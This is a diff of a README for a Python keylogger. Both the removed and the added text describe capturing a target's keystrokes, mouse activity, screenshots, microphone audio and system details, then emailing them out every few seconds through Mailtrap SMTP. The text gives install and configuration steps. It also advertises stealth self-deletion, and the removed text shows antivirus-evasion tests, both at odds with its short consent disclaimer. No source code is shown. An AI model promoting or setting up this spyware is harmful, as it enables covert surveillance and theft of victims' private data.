@@ -1,34 +1,89 @@
-# Inputs To Mail.
-Get Keyboard,Mouse,ScreenShot,Microphone Inputs and Send to your Mail.
-Purpose of the project is testing the security of information systems
 
-## INSTALLATION
+Keylogger Project
+Python
+License
 
-**You don't need to do anything for installation just run the script**
+A comprehensive keylogger application written in Python that captures keyboard inputs, mouse activities, system information, takes screenshots, and records microphone input, sending the collected data to a specified email address at regular intervals.
 
-![github-small](/images/Adsız.png)
+Features
+Keystroke Logging: Captures all keyboard inputs including special keys
 
-## USAGE
+Mouse Activity Tracking: Records mouse movements, clicks, and scrolls
 
-•**Create an account on "https://mailtrap.io/" using a temp mail.**
+System Information Collection: Gathers hostname, IP address, processor info, and system specs
 
-![github-small](https://github.com/aydinnyunus/WifiPassword-Stealer/blob/master/images/dene.png?raw=true)
+Screenshot Capture: Takes periodic screenshots of the user's desktop
 
+Audio Recording: Records microphone input at specified intervals
 
-•**Set your own SMTP USERNAME and SMTP PASSWORD on "keylogger.py".**
+Email Reporting: Sends collected data to a configured email address
 
-•**pip install -r requirements.txt**
+Stealth Operation: Includes self-removal capabilities
 
-•**python3 keylogger.py**
+Installation
+Clone the repository:
 
-•**Every 10 seconds,You Get the Data from the Target Computer**
+bash
+git clone https://github.com/yourusername/keylogger.git
+cd keylogger
+Install dependencies:
 
-•**If Target finds the Code and Open the File for Want to Learn your MAIL and Password The Program DELETE itself.**
+bash
+pip install -r requirements.txt
+Or install manually:
 
+bash
+pip install pyscreenshot sounddevice pynput
+Configuration
+Before running the keylogger, you need to configure your email settings:
 
-## ANTIVIRUS TEST
+Open the script in a text editor
 
-![github-small](/images/1.png)
+Modify these lines with your email credentials:
 
-![github-small](/images/2.png)
+python
+EMAIL_ADDRESS = "your_email@example.com"
+EMAIL_PASSWORD = "your_email_password"
+SEND_REPORT_EVERY = 10  # Time interval in seconds
+For Mailtrap users (default configuration), use:
 
+python
+SMTP_SERVER = "smtp.mailtrap.io"
+SMTP_PORT = 2525
+Usage
+Run the keylogger with Python:
+
+bash
+python keylogger.py
+The program will:
+
+Start capturing keyboard and mouse inputs
+
+Collect system information
+
+Take periodic screenshots and audio recordings
+
+Send reports via email at the specified interval
+
+Security and Legal Considerations
+⚠️ Important Notice:
+
+This software is for educational and legitimate monitoring purposes only
+
+Unauthorized monitoring of computers may violate privacy laws
+
+Always obtain proper consent before using this tool
+
+The developer is not responsible for misuse of this software
+
+Technical Details
+Components
+Keyboard Listener: Uses pynput to capture keystrokes
+
+Mouse Listener: Tracks mouse movements and clicks
+
+Screenshot: Uses pyscreenshot to capture desktop images
+
+Audio Recording: Uses sounddevice to record microphone input
+
+Email Reporting: Uses smtplib for sending collected data
